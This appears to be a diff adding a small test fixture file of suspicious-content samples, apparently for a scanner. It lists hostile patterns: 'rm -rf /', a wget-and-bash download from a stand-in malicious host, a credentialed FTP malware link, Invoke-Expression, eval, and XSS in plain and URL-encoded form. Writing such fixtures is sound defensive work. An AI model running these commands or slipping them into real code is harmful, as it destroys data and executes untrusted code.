@@ -1,0 +1,11 @@
+This is a test text file with suspicious content.
+
+Visit this dangerous link: javascript:alert('dangerous')
+Download from: ftp://user:password@example.com/malware.exe
+Execute this command: rm -rf /
+PowerShell command: Invoke-Expression "dangerous_script"
+Encoded payload: dGhpcyBpcyBhIGJhc2U2NCBlbmNvZGVkIHRleHQgdGhhdCBtaWdodCBiZSBzdXNwaWNpb3Vz
+More encoded: %3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E
+
+This line contains shell command: wget http://malicious.com/script.sh && bash script.sh
+Another dangerous pattern: eval("malicious_code")
